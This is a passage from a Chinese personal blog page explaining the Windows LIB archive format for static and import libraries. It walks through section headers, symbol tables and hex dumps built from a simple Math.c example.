<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 7.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">

<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Cascadia Code:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"deutschball.github.io","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"万一找到了呢","hits_empty":"你说的 ${query} 我怎么找不着呢 ","hits_stats":"找到了 ${hits} 个结果，用时 ${time} 毫秒"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":-1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="dustland">
<meta property="og:type" content="website">
<meta property="og:title" content="dustland">
<meta property="og:url" content="http://deutschball.github.io/impossible/page/7/index.html">
<meta property="og:site_name" content="dustland">
<meta property="og:description" content="dustland">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="dustball">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://deutschball.github.io/impossible/page/7/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'en'
  };
</script>

  <title>dustland</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">dustland</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
      <p class="site-subtitle" itemprop="description">dustball in dustland</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container"></div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div class="algolia-results">
  <div id="algolia-stats"></div>
  <div id="algolia-hits"></div>
  <div id="algolia-pagination" class="algolia-pagination"></div>
</div>

      
    </div>
  </div>

</div>
    </header>

    
  <div class="reading-progress-bar"></div>

  <a href="https://github.com/deutschball" class="github-corner" title="Follow me on GayHub" aria-label="Follow me on GayHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2022/08/19/lib%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E8%A7%A3%E6%9E%90/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
      <meta itemprop="name" content="dustball">
      <meta itemprop="description" content="dustland">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="dustland">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/08/19/lib%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E8%A7%A3%E6%9E%90/" class="post-title-link" itemprop="url">程序员的自我修养 chapter 9 LIB</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-08-19 11:13:00 / Modified: 11:13:36" itemprop="dateCreated datePublished" datetime="2022-08-19T11:13:00+08:00">2022-08-19</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="windows-lib文件格式">windows LIB文件格式</h1>
<h2 id="静态库">静态库</h2>
<p>以Math.c为例,将其分别编译静态库文件libMath.lib</p>
<p>Math.c</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">__declspec(dllexport) <span class="type">double</span> <span class="title function_">Add</span><span class="params">(<span class="type">double</span> a,<span class="type">double</span> b)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a+b;</span><br><span class="line">&#125;</span><br><span class="line">__declspec(dllexport) <span class="type">double</span> <span class="title function_">Sub</span><span class="params">(<span class="type">double</span> a,<span class="type">double</span> b)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a-b;</span><br><span class="line">&#125;</span><br><span class="line">__declspec(dllexport) <span class="type">double</span> <span class="title function_">Mul</span><span class="params">(<span class="type">double</span> a,<span class="type">double</span> b)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a*b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>制作静态库</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lib Math.c /NAME:libMath.lib</span><br></pre></td></tr></table></figure>
<p>lib以一个文件魔数<code>!&lt;arch&gt;\n</code>开头,</p>
<p>接下来顺次是First Section,Second Section,Long Section,Obj
Section.</p>
<p>如果本lib文件中包括了多个obj文件则ObjSection可以有多个.</p>
<p>Long
Section用来存放太长的obj名称,如果没有超过16个字节的obj名则该节不存在</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220818165031140.png"
alt="libMath.lib的结构" />
<figcaption aria-hidden="true">libMath.lib的结构</figcaption>
</figure>
<h3 id="文件头魔数">文件头魔数</h3>
<p>不管是静态库还是导入库, 只要是lib文件,开头八个字节都得是文件魔数,</p>
<p>arch,archieve,归档</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220818144331204.png"
alt="image-20220818144331204" />
<figcaption aria-hidden="true">image-20220818144331204</figcaption>
</figure>
<h3 id="节区">节区</h3>
<p>每个节区都是以一个结构体开始,可以认为是"节区头"</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">SectionHeader</span>&#123;</span></span><br><span class="line">        <span class="type">char</span> Name[<span class="number">16</span>];      <span class="comment">// 节名称,即obj文件名</span></span><br><span class="line">        <span class="type">char</span> Time[<span class="number">12</span>];      <span class="comment">// 时间</span></span><br><span class="line">        <span class="type">char</span> UserID[<span class="number">6</span>];     <span class="comment">// 用户ID</span></span><br><span class="line">        <span class="type">char</span> GroupID[<span class="number">6</span>];    <span class="comment">// 组ID</span></span><br><span class="line">        <span class="type">char</span> Mode[<span class="number">8</span>];       <span class="comment">// 模式</span></span><br><span class="line">        <span class="type">char</span> Size[<span class="number">10</span>];      <span class="comment">// 节区正文长度</span></span><br><span class="line">        <span class="type">char</span> EndOfHeader[<span class="number">2</span>];<span class="comment">// 节头结束符</span></span><br><span class="line">&#125; ;</span><br></pre></td></tr></table></figure>
<p>全都是字符串格式用字节存储,其好处是不管大小端机器,都可以兼容</p>
<p>很奇怪的是FirstSection采用大端模式,到了SecondSection就又成了小端存储了</p>
<p>节区头后面紧跟着是该节的节区正文</p>
<p>即每个节区都是节区头+节区正文格式</p>
<p>相邻两个节区之间可能存在<del>胸垫</del>填充,比如FirstSection的节区正文结束和SecondSection的节头开始之间就存在一个字节的填充</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220818164735293.png"
alt="image-20220818164735293" />
<figcaption aria-hidden="true">image-20220818164735293</figcaption>
</figure>
<p>怎么判断有没有填充呢?怎么寻找下一个节的开始位置呢?</p>
<p>每个节头大小是固定的60字节,最后两个字节一定是endMarker[2]="\60
\0A"</p>
<h4 id="first-section">First Section</h4>
<p><strong>大端模式</strong></p>
<p>包含库中<strong>所有</strong>符号名以及这些符号所在目标文件在本lib库文件中的偏移量</p>
<blockquote>
<p>此处"所有"是指参与组成本lib文件的所有目标文件中的所有符号,不只是一个目标文件中的所有符号</p>
</blockquote>
<p>其节名就用了一个字符"/"</p>
<p>Size指明了本节正文占用了多少个字节</p>
<p>节正文结构:</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">FirstSection</span>&#123;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> SymbolNum;<span class="comment">//大端存储的符号数量</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> SymbolOffset[SymbolNum];<span class="comment">//符号所在目标节的偏移</span></span><br><span class="line">    <span class="type">char</span> StrTable[m];<span class="comment">//符号名称字符串表,m取决于所有符号的长度</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>对于libMath.lib的第FirstSection,其节区正文的16进制表示为:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">SymbolNum = 00 00 00 03 </span><br><span class="line"></span><br><span class="line">SymbolOffset[SymbolNum] = </span><br><span class="line">	00 00 00 C2 </span><br><span class="line">	00 00 00 C2 </span><br><span class="line">	00 00 00 C2</span><br><span class="line"></span><br><span class="line">StrTable[m] = </span><br><span class="line">	5F 41 64 64 00 </span><br><span class="line">	5F 4D 75 6C 00 </span><br><span class="line">	5F 53 75 62 00</span><br></pre></td></tr></table></figure>
<p>在32位机器上long和int一样长都是32位,因此unsigned
long占用了前4个字节</p>
<p>由于大端存储因此03在最高位(最右侧)</p>
<p><code>SymbolNum=3</code>,这与Math.c中正好有三个函数符号相吻合</p>
<p><code>SymbolOffset[3]=&#123;C2,C2,C2&#125;</code>这表明三个符号同属于一个目标模块,这个目标模块在本lib文件中的偏移量是C2</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220818152323244.png"
alt="image-20220818152323244" />
<figcaption aria-hidden="true">image-20220818152323244</figcaption>
</figure>
<p>C2位置确实是第一个也是唯一一个ObjSection的偏移量,这个ObjSection就是Math.obj</p>
<p><code>StrTable[m]=_Add._Mul._Sub.</code>即所有符号名,每个符号名都以00结尾</p>
<h4 id="second-section">Second Section</h4>
<p><strong>小端模式</strong></p>
<p>内容和FirstSection相同,但是是一个有序表,查这个比查First
Section来的快</p>
<p>名字也和FirstSection相同,都是"/"</p>
<p>正文结构:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">SecondSection</span>&#123;</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> ObjNum;<span class="comment">//本库文件中的Obj节数量</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> ObjOffset[ObjNum];<span class="comment">//每个Obj节分别的偏移量,</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> SymbolNum;<span class="comment">//所有符号数量,作用和FirstSection.SymbolNum相同</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">short</span> SymbolIdx[SymbolNum];<span class="comment">//第i个符号所在的Obj节下标</span></span><br><span class="line">	<span class="type">char</span> StrTable[m];<span class="comment">//符号名表,同FirstSection.StrTable,第i个符号的符号名</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ObjNum= 01 00 00 00 </span><br><span class="line">ObjOffset[ObjNum] = C2 00 00 00 </span><br><span class="line">SymbolNum = 03 00 00 00 </span><br><span class="line">SymbolIdx[SymbolNum] = </span><br><span class="line">	01 00 </span><br><span class="line">	01 00</span><br><span class="line">	01 00 </span><br><span class="line">StrTable[SymbolNum] = </span><br><span class="line">	5F 41 64 64 00 		_Add\0</span><br><span class="line">	5F 4D 75 6C 00 		_Mul\0</span><br><span class="line">	5F 53 75 62 00		_Sum\0</span><br></pre></td></tr></table></figure>
<p>比较FirstSection和SecondSection</p>
<table>
<colgroup>
<col style="width: 17%" />
<col style="width: 34%" />
<col style="width: 37%" />
<col style="width: 10%" />
</colgroup>
<thead>
<tr>
<th></th>
<th>FirstSection</th>
<th>SecondSection</th>
<th>意义是否相同</th>
</tr>
</thead>
<tbody>
<tr>
<td>存储方式</td>
<td>大端</td>
<td>小端</td>
<td></td>
</tr>
<tr>
<td>记录符号个数</td>
<td>SymbolNum</td>
<td>SymbolNum</td>
<td>相同</td>
</tr>
<tr>
<td>记录符号位置</td>
<td>SymbolOffset[i]第i个符号所在obj的节偏移量</td>
<td>SymbolIdx[i]第i个符号所在的obj节是第几个obj节</td>
<td>不同</td>
</tr>
<tr>
<td>记录符号名</td>
<td>StrTable[m]</td>
<td>StrTable[m]</td>
<td>相同</td>
</tr>
<tr>
<td>记录Obj节数</td>
<td>无</td>
<td>ObjNum</td>
<td></td>
</tr>
<tr>
<td>记录每个Obj节的偏移量</td>
<td>无</td>
<td>ObjOffset[ObjNum]</td>
<td></td>
</tr>
</tbody>
</table>
<h4 id="long-section">Long Section</h4>
<p>长名称节,存放太长的obj名</p>
<p>每个节开始时的SectionHeader会记录该节的信息,但是SectionHeader.Name只有16字节,如果一个obj文件名比如"LinkedDoubleList.obj"长度就超过了16字节,用Name[16]显然放不下,就得放到Long
section节里,Name[16]存放的是"<code>/&lt;LongSection中的偏移量&gt;</code>"表明该节名需要去Long
Section找,并且给出了相对于该节的位置</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220818154931447.png"
alt="image-20220818154931447" />
<figcaption aria-hidden="true">image-20220818154931447</figcaption>
</figure>
<p>Math.obj显然不够16个字节,本lib文件中没有该节</p>
<h4 id="obj-section">Obj Section</h4>
<p>目标文件节,存放不同的目标文件的原始数据.</p>
<p>本节的节区正文相当于把COFF文件直接乎过来了</p>
<p>节头:</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220818154534122.png"
alt="image-20220818154534122" />
<figcaption aria-hidden="true">image-20220818154534122</figcaption>
</figure>
<p>从名称上可以看出Math.obj/</p>
<p>Size=794本节正文长794个字节</p>
<p>节区正文是直接抄的obj文件</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220818155306689.png"
alt="节区正文" />
<figcaption aria-hidden="true">节区正文</figcaption>
</figure>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220818155335088.png"
alt="Math.obj" />
<figcaption aria-hidden="true">Math.obj</figcaption>
</figure>
<p>节区正文和Math.obj完全相同</p>
<h2 id="导入库">导入库</h2>
<p>还是以Math.c制作动态库时形成的导入库Math.lib为例</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">__declspec(dllexport) <span class="type">double</span> <span class="title function_">Add</span><span class="params">(<span class="type">double</span> a,<span class="type">double</span> b)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a+b;</span><br><span class="line">&#125;</span><br><span class="line">__declspec(dllexport) <span class="type">double</span> <span class="title function_">Sub</span><span class="params">(<span class="type">double</span> a,<span class="type">double</span> b)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a-b;</span><br><span class="line">&#125;</span><br><span class="line">__declspec(dllexport) <span class="type">double</span> <span class="title function_">Mul</span><span class="params">(<span class="type">double</span> a,<span class="type">double</span> b)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a*b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cl Math.c /c</span><br><span class="line">link /dll Math.obj</span><br></pre></td></tr></table></figure>
<p>编译链接完成后同一目录下面形成Math.lib和Math.dll</p>
<p>此Math.lib就是导入库</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220818165520115.png"
alt="image-20220818165520115" />
<figcaption aria-hidden="true">image-20220818165520115</figcaption>
</figure>
<p>从节头名看,前两个节分别是FirstSection和SecondSection,后面就都是目标文件了</p>
<h3 id="文件头魔数-1">文件头魔数</h3>
<p>所有lib文件不管是静态库还是导入库都一样<code>!&lt;arch&gt;</code></p>
<h3 id="节区-1">节区</h3>
<h4 id="first-section-1">First Section</h4>
<p>节头除了本节正文大小之外就没有什么有效信息了主要是看节区:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">FirstSection</span>&#123;</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> SymbolNum;<span class="comment">//大端存储的符号数量</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> SymbolOffset[SymbolNum];<span class="comment">//符号所在目标节的偏移</span></span><br><span class="line">    <span class="type">char</span> StrTable[m];<span class="comment">//符号名称字符串表,m取决于所有符号的长度</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">SymbolNum = 00 00 00 09 </span><br><span class="line">SymbolOffset[SymbolNum] = </span><br><span class="line">00 00 01 CA </span><br><span class="line">00 00 03 E8 </span><br><span class="line">00 00 05 1C</span><br><span class="line">00 00 06 68 </span><br><span class="line">00 00 06 68 </span><br><span class="line">00 00 07 24 </span><br><span class="line">00 00 07 24</span><br><span class="line">00 00 06 C6 </span><br><span class="line">00 00 06 C6 </span><br><span class="line">StrTable[m] = </span><br><span class="line">__IMPORT_DESCRIPTOR_Math: 5F 5F 49 4D 50 4F 52 54 5F 44 45 53 43 52 49 50 54 4F 52 5F 4D 61 74 68 00 </span><br><span class="line">__NULL_IMPORT_DESCRIPTOR: 5F 5F 4E 55 4C 4C 5F 49 4D 50 4F 52 54 5F 44 45 53 43 52 49 50 54 4F 52 00 </span><br><span class="line">Math_NULL_THUNK_DATA: 7F 4D 61 74 68 5F 4E 55 4C 4C 5F 54 48 55 4E 4B 5F 44 41 54 41 00</span><br><span class="line">_Add: 5F 41 64 64 00 </span><br><span class="line">__imp__Add: 5F 5F 69 6D 70 5F 5F 41 64 64 00</span><br><span class="line">_Sub: 5F 53 75 62 00 </span><br><span class="line">__imp__Sub: 5F 5F 69 6D 70 5F 5F 53 75 62 00</span><br><span class="line">_Mul: 5F 4D 75 6C 00 </span><br><span class="line">__imp__Mul: 5F 5F 69 6D 70 5F 5F 4D 75 6C 00</span><br></pre></td></tr></table></figure>
<p>可以看出本导入库中有9个符号,前三个符号</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">__IMPORT_DESCRIPTOR_Math</span><br><span class="line">__NULL_IMPORT_DESCRIPTOR </span><br><span class="line">Math_NULL_THUNK_DATA</span><br></pre></td></tr></table></figure>
<p>是预定义的,就算我们啥也不写,照样有这三个符号</p>
<p>然后每个我们自己写的函数都有两个名字,比如</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">_Add</span><br><span class="line">__imp__Add</span><br></pre></td></tr></table></figure>
<p>这是x64符号名修饰造成的,实际上两个符号指向同一函数</p>
<h4 id="second-section-1">Second Section</h4>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">SecondSection</span>&#123;</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> ObjNum;<span class="comment">//本库文件中的Obj节数量</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> ObjOffset[ObjNum];<span class="comment">//每个Obj节分别的偏移量,</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> SymbolNum;<span class="comment">//所有符号数量,作用和FirstSection.SymbolNum相同</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">short</span> SymbolIdx[SymbolNum];<span class="comment">//第i个符号所在的Obj节下标</span></span><br><span class="line">	<span class="type">char</span> StrTable[m];<span class="comment">//符号名表,同FirstSection.StrTable,第i个符号的符号名</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">ObjNum = 06 00 00 00 </span><br><span class="line">ObjOffset[ObjNum]=</span><br><span class="line">	CA 01 00 00 </span><br><span class="line">	E8 03 00 00 </span><br><span class="line">	1C 05 00 00</span><br><span class="line">	68 06 00 00 </span><br><span class="line">	24 07 00 00 </span><br><span class="line">	C6 06 00 00 </span><br><span class="line">SymbolNum=09 00 00 00</span><br><span class="line">SymbolIdx[SymbolNum]=</span><br><span class="line">	04 00 </span><br><span class="line">	06 00 </span><br><span class="line">	05 00 </span><br><span class="line">	01 00 </span><br><span class="line">	02 00 </span><br><span class="line">	04 00 </span><br><span class="line">	06 00 </span><br><span class="line">	05 00</span><br><span class="line">	03 00 </span><br><span class="line">StrTable[m]=</span><br><span class="line">5F 41 64 64 00 </span><br><span class="line">5F 4D 75 6C 00 </span><br><span class="line">5F 53 75 62 00 </span><br><span class="line">5F 5F 49 4D 50 4F 52 54 5F 44 45 53 43 52 49 50 54 4F 52 5F 4D 61 74 68 00 </span><br><span class="line">5F 5F 4E 55 4C 4C 5F 49 4D 50 4F 52 54 5F 44 45 53 43 52 49 50 54 4F 52 00 </span><br><span class="line">5F 5F 69 6D 70 5F 5F 41 64 64 00 </span><br><span class="line">5F 5F 69 6D 70 5F 5F 4D 75 6C 00 </span><br><span class="line">5F 5F 69 6D 70 5F 5F 53 75 62 00 </span><br><span class="line">7F 4D 61 74 68 5F 4E 55 4C 4C 5F 54 48 55 4E 4B 5F 44 41 54 41 00</span><br></pre></td></tr></table></figure>
<p>共有6个ObjSection段</p>
<p>每个ObjSection的节头中的名字都叫"Math.dll"</p>
<h4 id="obj-section-1">Obj Section</h4>
<p>前三个Obj节都是关于三个预定义符号的,所有的导入库中他仨基本相同</p>
<p>后面三个Obj节是关于我们自定义的函数的,每个自定义函数自成一节,这也就解释了为啥默认状态下动态库的链接是以函数为单位,而静态库的链接是以模块为单位的了.导入库中每个函数自成一个模块</p>
<p>下面炎鸠后三节的结构,参考<a
target="_blank" rel="noopener" href="https://www.codeproject.com/Articles/1253835/The-Structure-of-import-Library-File-lib">The
Structure of import Library File (.lib) - CodeProject</a></p>
<p>以Add函数所在节为例</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220819104759118.png"
alt="image-20220819104759118" />
<figcaption aria-hidden="true">image-20220819104759118</figcaption>
</figure>
<p>节头表明正文部分有34字节</p>
<p>描述正文的结构体:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">SYMBOL_DESCRIPTOR</span>          // <span class="title">size</span> =</span> <span class="number">0x14</span></span><br><span class="line">&#123;</span><br><span class="line">    WORD a;</span><br><span class="line">    WORD b;</span><br><span class="line">    WORD c;</span><br><span class="line">    WORD Architecture;<span 